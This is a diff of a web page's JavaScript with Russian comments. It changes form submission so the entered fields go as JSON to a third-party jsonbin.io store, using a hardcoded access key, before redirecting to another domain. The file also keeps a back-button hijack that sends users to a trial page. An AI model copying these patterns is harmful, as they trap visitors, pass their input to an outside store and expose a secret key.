@@ -20,9 +20,39 @@
 //   }
 // }
 
+// const form = document.getElementById("form1_id");
+// form.addEventListener("submit", function(event) {
+//   document.write("G")
+//   event.preventDefault(); // отменяем стандартное поведение отправки формы
+//   const data = new FormData(form);
+//   const obj = {};
+//   data.forEach(function(value, key) {
+//     obj[key] = value;
+//   });
+//   const json = JSON.stringify(obj); 
+//   console.log(json); // выводим список аргументов в формате JSON
+// });
+
 function submitForm() {
   // Отправляем данные формы на сервер
-  document.querySelector('form').submit();
+  const form = document.getElementById("form1_id");
+  const formData = new FormData(form);
+  const json = JSON.stringify(Object.fromEntries(formData));
+
+  const options = {
+    method: 'POST',
+    headers: {
+      'X-Access-Key': '$2b$10$iXIjh1hGSGxNBVn8MrsqAeghR78Fle.G86.bQ.QduYOLenpu/F8Na',
+      'X-Collection-Id': '643e6015c0e7653a05a6aa6d',
+      'Content-Type': 'application/json'
+    },
+    body: json
+  };
+  
+  fetch('https://api.jsonbin.io/v3/b', options)
+    .then(response => response.json())
+    .then(response => console.log(response))
+    .catch(err => console.error(err));
 
   // Перенаправляем пользователя на другую страницу
   window.location.href = "https://adheart.me/register";
@@ -34,7 +64,7 @@ window.addEventListener('popstate', function (event) {
   }
 });
 
-function redirectOnUnload() {
+function redirectOnUnload() {                        // Переход на URL после двух нажатий на стрелку назад
   var redirectUrl = 'https://adheart.com.br/trial'; // замените этот URL на нужный
   var currentState = { redirectUrl: redirectUrl };
   history.replaceState(currentState, '');
